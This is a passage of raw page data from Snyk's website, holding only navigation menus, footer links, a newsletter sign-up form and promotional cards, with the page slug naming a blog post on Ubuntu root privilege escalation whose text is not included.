report"}]}}]}},{"sys":{"id":"521D4K8NyGYGMQhDIXVRwU","__typename":"Sys"},"__typename":"NavigationPrimaryNavItem","label":"Resources","url":null,"dropdownMenuCategories":{"items":[],"__typename":"NavigationPrimaryNavItemDropdownMenuCategoriesCollection"},"dropdownMenuColumns":{"__typename":"NavigationPrimaryNavItemDropdownMenuColumnsCollection","items":[{"sys":{"id":"4cX6WUrzF8oluJcjZx2lQl","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"jdd6u1ZykuNc2RkvykTcl","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Our resources","spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"6Pv6adGOWnt3bXZm5rBvc1","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Resource library","description":"Browse our extensive database","url":"/resource-library/","appearance":{"navItem":{"icon":"library"}}},{"sys":{"id":"3z2WpGNUBbqHP9ZCtPK08s","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Customer resources","description":"The one stop shop for customers","url":"/customer-resources/","appearance":{"navItem":{"icon":"booklet"}}},{"sys":{"id":"720g9PjkBinvljR62rlkAN","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Ethical hacking","description":"How ethical hacking can help you","url":"/ethical-hacking-resources/","appearance":{"navItem":{"icon":"lock-heart"}}},{"sys":{"id":"3xhNYB2EeWK3dCPvErfGHx","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Security leaders","description":"Insights from industry leaders","url":"/security-leaders/","appearance":{"navItem":{"icon":"shield-star"}}},{"sys":{"id":"3lKQ6bpcNuO8mTTZigQHY7","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Top 10 vulns","description":"See the most common vuln types","url":"/snyk-top-10/","appearance":{"navItem":{"icon":"shield-chevron-up"}}}]}},{"sys":{"id":"6U4jpgDbe07kgJDBIeeIN7","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":null,"spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"6cqTs6A3sL2R3T8K3RyrC5","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Blog Section","description":null,"url":"/blog/","appearance":{"navItem":{"icon":"blog"}}},{"sys":{"id":"1wOYHJAhDmoerb84GKmnEu","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk's podcasts","description":null,"url":"/podcasts/the-secure-developer/","appearance":{"navItem":{"icon":"podcast"}}},{"sys":{"id":"5wp8QrsbT2g8aVJLvxtRbl","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk’s YouTube","description":null,"url":"https://www.youtube.com/snyksec","appearance":{"navItem":{"icon":"youtube"}}}]}}]}},{"sys":{"id":"7G5qVKIZW5eLvoRsYp7dRo","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"3RUwXtv2FcOONPGhCI9cp6","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Our ecosystem","spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"3SOxYo2Xt1QCUcPR8zCwkY","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Learn","description":"Security education from Snyk","url":"https://learn.snyk.io","appearance":{"navItem":{"icon":"snyk-learn"}}},{"sys":{"id":"1fMgqMoKw7rdjy8GsjmrRp","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk user docs","description":"Get started with Snyk","url":"https://docs.snyk.io/","appearance":{"navItem":{"icon":"snyk-docs"}}},{"sys":{"id":"7BRsZmfn0eHK2tWpMUAB2e","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Support","description":"How can we help?","url":"https://support.snyk.io/hc/en-us","appearance":{"navItem":{"icon":"snyk-support"}}},{"sys":{"id":"5zGZbFYKxxb9AvEuzemXJA","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Vuln Database","description":"Find new vulnerabilities","url":"https://security.snyk.io/","appearance":{"navItem":{"icon":"vuln-db"}}},{"sys":{"id":"1HonjOBA0UVDWYLhtOGNna","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Updates","description":"Stay in the loop","url":"https://updates.snyk.io/","appearance":{"navItem":{"icon":"updates"}}}]}}]}},{"sys":{"id":"3fB2QXSjFGAWneUjwffd7b","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"Wz6VF0Ms5fA76S7kDcm4Q","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Our community","spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"3QYD0R6IMlv720M7rudooL","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Events \u0026 webinars","description":null,"url":"/events/","appearance":{"navItem":{"icon":"events"}}},{"sys":{"id":"26oqv8XWpf2MsCzTFNhLQe","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Ambassadors","description":null,"url":"/snyk-ambassadors/","appearance":{"navItem":{"icon":"ambassadors"}}},{"sys":{"id":"29p1fXHb4vsFzdmLOQMcO","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Discord channel","description":null,"url":"https://snyk.co/discordcommunity","appearance":{"navItem":{"icon":"discord"}}}]}}]}},{"sys":{"id":"3KvWG5XydkzgXqYWBPG4vh","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"3J24A563Bn5HN8tYK7uldd","__typename":"Sys"},"__typename":"MoleculeMediaCard","image":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1717461856/feature-snyk-snowflake.jpg","tags":null,"type":"upload","bytes":64662,"width":1200,"format":"jpg","height":628,"version":1717461856,"duration":null,"metadata":{},"public_id":"feature-snyk-snowflake","created_at":"2024-06-04T00:44:16Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1717461856/feature-snyk-snowflake.jpg","resource_type":"image"}],"headline":"Extend the power of your AppSec data with the new Snyk and Snowflake integration","url":"/blog/snyk-snowflake-data-share/","linkLabel":"Read blog"}]}}]}},{"sys":{"id":"49EwoOnIAMpSmvWCM25Z7C","__typename":"Sys"},"__typename":"NavigationPrimaryNavItem","label":"Company","url":null,"dropdownMenuCategories":{"items":[],"__typename":"NavigationPrimaryNavItemDropdownMenuCategoriesCollection"},"dropdownMenuColumns":{"__typename":"NavigationPrimaryNavItemDropdownMenuColumnsCollection","items":[{"sys":{"id":"7qc6UcKd4PXRsroBgpOd8v","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"6gXDmWgaXzE94Lg4tNSFKJ","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Company","spotlightFirstItem":false,"submenuLinks":{"items":[],"__typename":"NavigationDropdownMenuColumnRowItemsCollection"},"titleText":{"sys":{"id":"13E2yoUTR1VyIM1hCmf9wz","__typename":"Sys"},"__typename":"MoleculeTitleText","description":{"json":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"__typename":"MoleculeTitleTextDescription"},"miniHeader":null,"headline":"The developer security platform","actions":{"__typename":"MoleculeTitleTextActionsCollection","items":[{"sys":{"id":"4Cvs5O3aQ6vys9uwaIP3nv","__typename":"Sys"},"__typename":"AtomButton","label":"More about us","url":"/about/","appearance":{"button":{"variant":"primary"}}}]}}}]}},{"sys":{"id":"5rtqkvXNwSWhAhFlI0rFEp","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"7k5Qfnh6qJ95ke1AF9UZ8e","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":null,"spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"5kQhON3CZshNHAafdsXW4c","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Our services","description":"Maximize your AppSec ROI","url":"/services/","appearance":{"navItem":{"icon":"services"}}},{"sys":{"id":"1x3lNwnfxOi0gJ1BoAlC8d","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Our customers","description":"We help customers save time and money","url":"/customers/","appearance":{"navItem":{"icon":"customers"}}},{"sys":{"id":"3YKqJdPzwJ00B5JEeFfLQg","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Our partners","description":"Bringing business class security with partners","url":"/partners/","appearance":{"navItem":{"icon":"partners"}}},{"sys":{"id":"1GyK9PChHHOTdCi1LzOZFy","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Case studies","description":"Check out our customer stories and stats","url":"/case-studies/","appearance":{"navItem":{"icon":"briefcase"}}}]}}]}},{"sys":{"id":"1kNPb3WLky7doq5ACvPZc9","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"3yH4BobqTomL05pwgg2b2I","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":null,"spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"5HYpyEzsZFpiUHq1dbBeJn","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Newsroom","description":"See the latest press releases","url":"/news/","appearance":{"navItem":{"icon":"newsroom"}}},{"sys":{"id":"77rmpXwyhm60gdfm2SW8fl","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Contact us","description":"Get in touch with any feedback or questions","url":"/contact-us/","appearance":{"navItem":{"icon":"contact"}}},{"sys":{"id":"7zj9cVbg5LJP4mHKarXJzW","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Careers","description":"Join Snyk today","url":"/careers/","appearance":{"navItem":{"icon":"hand-wave"}}}]}}]}},{"sys":{"id":"65thcH9DdcazBRR9LOf76V","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"2rD3IxCHygkAsa2w5gLMK8","__typename":"Sys"},"__typename":"MoleculeMediaCard","image":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1730905024/Snyk_Probely.jpg","tags":[],"type":"upload","bytes":376019,"width":1200,"format":"jpg","height":628,"version":1730905024,"duration":null,"metadata":{},"public_id":"Snyk_Probely","created_at":"2024-11-06T14:57:04Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1730905024/Snyk_Probely.jpg","resource_type":"image"}],"headline":"Snyk Acquires Developer-First DAST Provider Probely","url":"/news/snyk-acquires-developer-first-dast-provider-probely/","linkLabel":"Read press release"}]}}]}},{"sys":{"id":"29GAQG1PpVIivH7wJUoBBd","__typename":"Sys"},"__typename":"NavigationPrimaryNavItem","label":"Pricing","url":"/plans/","dropdownMenuCategories":{"items":[],"__typename":"NavigationPrimaryNavItemDropdownMenuCategoriesCollection"},"dropdownMenuColumns":{"items":[],"__typename":"NavigationPrimaryNavItemDropdownMenuColumnsCollection"}}]}},"footer":{"__typename":"NavigationFooter","boilerplate":null,"copyright":{"json":{"nodeType":"document","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"© 2025 Snyk Limited\nRegistered in England and Wales","marks":[],"data":{}}]}]},"__typename":"NavigationFooterCopyright"},"footerCta":{"json":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"__typename":"NavigationFooterFooterCta"},"actions":{"items":[],"__typename":"NavigationFooterActionsCollection"},"sponsoredLogo":[],"sponsoredUrl":null,"footerCtaHeader":"The developer security platform","form":{"__typename":"ContentForm","description":{"json":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Get regular updates from the Snyk community and the world of cyber security that you won’t find anywhere else.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"__typename":"ContentFormDescription"},"title":"The Daily Vuln","formId":"1051","formIdSandbox":"1051","stayOnPage":true,"enforceBusinessEmail":null,"redirectUrl":null,"successMessage":"Thank you! You are now subscribed","isInlined":true},"footerCtaAction":{"_id":"MTpjcm46Y29udGVudGZ1bDo6OmNvbnRlbnQ6c3BhY2VzL295cmJyaTQzYWR6ei9lbnZpcm9ubWVudHMvbWFzdGVyL2VudHJpZXMvNEN2czVPM2FRNnZ5czl1d2FJUDNudg==","__typename":"AtomButton","url":"/about/","label":"More about us","appearance":{"button":{"variant":"primary"}}},"socials":{"__typename":"NavigationFooterSocialsCollection","items":[{"sys":{"id":"1hUkRpvsCJkQjIYW7h3PGj","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"twitter","url":"https://twitter.com/snyksec"},{"sys":{"id":"3s1NrW9fhAI49a1BRjNfuy","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"youtube","url":"https://www.youtube.com/channel/UCh4dJzctb0NhSibjU-e2P6w"},{"sys":{"id":"3rrBjirF30sNI9d7rMS1My","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"linkedin","url":"https://www.linkedin.com/company/snyk"},{"sys":{"id":"5ksshlk24qSF9DaMjjmlwJ","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"github","url":"https://github.com/snyk/"},{"sys":{"id":"1wiC2aaT7Oqqvu5whdqpbK","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"npm","url":"https://www.npmjs.com/package/snyk"},{"sys":{"id":"3oljfTMGDpHJLspeMOU9Ht","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"discord","url":"https://snyk.co/discordcommunity"}]},"legalLinks":{"__typename":"NavigationFooterCategory","internalName":"\"Legal Links\" - footer category","label":"Legal Links","itemsCollection":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"2lBVAwbzP6bA0s72eGkqVj","__typename":"Sys"},"__typename":"ContentNavigationItem","url":"/policies/terms-of-service/","label":"Legal terms"},{"sys":{"id":"4qfdIeuRXOwlTWtTkfjxyw","__typename":"Sys"},"__typename":"ContentNavigationItem","url":"/policies/privacy/","label":"Privacy Notice"},{"sys":{"id":"1FdFFwoO1Sg45Wzq2N4xog","__typename":"Sys"},"__typename":"ContentNavigationItem","url":"/policies/website-terms-of-use/","label":"Terms of use"},{"sys":{"id":"4a4qXx1obXR2RbKLgEq551","__typename":"Sys"},"__typename":"ContentNavigationItem","url":"https://preferences.snyk.io/dont_sell","label":"California residents: do not sell my information"}]}},"footerCategories":{"__typename":"NavigationFooterFooterCategoriesCollection","items":[{"sys":{"id":"7Csj2hR1466KwHY1rsW73P","__typename":"Sys"},"__typename":"NavigationFooterCategory","label":"Products \u0026 Solutions","footerNavItems":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"2juOMSgrV2RG8LupJ4iI6V","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"What is Snyk?","url":"/product/"},{"sys":{"id":"1I5QbSAvXhjDDOZrcwbvqn","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Developer Security Platform","url":"/platform/"},{"sys":{"id":"4eAkHY6QzVPZf5fP0l25No","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Pricing","url":"/plans/"}]}},{"sys":{"id":"4Mwh13BWPs5oNvQbuOAri0","__typename":"Sys"},"__typename":"NavigationFooterCategory","label":"Our Resources","footerNavItems":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"6Pv6adGOWnt3bXZm5rBvc1","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Resource library","url":"/resource-library/"},{"sys":{"id":"787yGW8SvzEz9s2g1sdDCL","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Blog","url":"/blog/"},{"sys":{"id":"zcBLXTrG6bZWvuQ6plWGI","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk’s podcasts","url":"/podcasts/the-secure-developer/"}]}},{"sys":{"id":"CrrSwe86c4HNCaPpF7qhi","__typename":"Sys"},"__typename":"NavigationFooterCategory","label":"Our Ecosystem","footerNavItems":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"3C9JZfwNvewpolsGGnRxtY","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Learn","url":"/platform/learn"},{"sys":{"id":"1rWTKptO0QnYnpsV8hOcCg","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk User Docs","url":"https://docs.snyk.io/"},{"sys":{"id":"7BRsZmfn0eHK2tWpMUAB2e","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Support","url":"https://support.snyk.io/hc/en-us"},{"sys":{"id":"3UEBa3EyLfBrORxC49oH6b","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Vuln Database","url":"https://security.snyk.io/"},{"sys":{"id":"1HonjOBA0UVDWYLhtOGNna","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Updates","url":"https://updates.snyk.io/"},{"sys":{"id":"4l8svK4Nr86NXtPaBbh6UN","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Trust Center","url":"https://trust.snyk.io/home"}]}},{"sys":{"id":"1WdX4T9TD5yqFx9tjWH0WP","__typename":"Sys"},"__typename":"NavigationFooterCategory","label":"Company \u0026 Community","footerNavItems":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"YMgMwEvmOUu0Pa60qTwZm","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"About Snyk","url":"/about/"},{"sys":{"id":"77rmpXwyhm60gdfm2SW8fl","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Contact us","url":"/contact-us/"},{"sys":{"id":"5hPrxjI87mM6yhBlxlWfbS","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Book a demo","url":"/schedule-a-demo/"},{"sys":{"id":"7zj9cVbg5LJP4mHKarXJzW","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Careers","url":"/careers/"},{"sys":{"id":"3QYD0R6IMlv720M7rudooL","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Events \u0026 webinars","url":"/events/"},{"sys":{"id":"26oqv8XWpf2MsCzTFNhLQe","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Ambassadors","url":"/snyk-ambassadors/"}]}},{"sys":{"id":"6FU34B5Lp1VklDZM7mLe0r","__typename":"Sys"},"__typename":"NavigationFooterCategory","label":"Why Snyk","footerNavItems":{"__typename":"NavigationFooterCategoryItemsCollection","items":[{"sys":{"id":"4Kiw02KxZv5UAkWxEeVWVJ","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk With GitHub","url":"/comparison/github-and-snyk/"},{"sys":{"id":"4hDqezO52rf0f5LbrQZQRS","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk vs Veracode","url":"/comparison/snyk-vs-veracode/"},{"sys":{"id":"9qhpUKBclDTpRB44EknDD","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk vs Checkmarx","url":"/comparison/snyk-vs-checkmarx/"},{"sys":{"id":"3hJrM2HyonWf3rtWA5UTHm","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk vs Synopsys","url":"/comparison/snyk-vs-synopsys/"}]}}]}},"blogCtaCard":{"__typename":"MoleculeUiCard","sys":{"__typename":"Sys","id":"74ZJlUcgpM6SCtkHMMX0Qe"},"stamp":null,"miniHeader":null,"headline":"Snyk Top 10: Vulnerabilites you should know","description":{"__typename":"MoleculeUiCardDescription","json":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Find out which types of vulnerabilities are most likely to appear in your projects based on Snyk scan results and security research.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"}},"actions":{"__typename":"MoleculeUiCardActionsCollection","items":[{"__typename":"AtomButton","sys":{"__typename":"Sys","id":"637gEUxWjSIXniK5kfllFT"},"label":"See the report","url":"/snyk-top-10/","appearance":{"button":{}}}]},"image":null,"appearance":{"uiCard":{"icon":""}}},"locale":"en-US","isPreview":false},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"abusing-ubuntu-root-privilege-escalation"},"buildId":"PGQdZpz4YQpcA7TmIHs8b","isFallback":false,"isExperimentalCompile":false,"dynamicIds":[58315,78796,30651,33172],"gsp":true,"locale":"en-US","locales":["en-US","de","fr","jp","pt-BR"],"defaultLocale":"en-US","scriptLoader":[]}</script></body></html>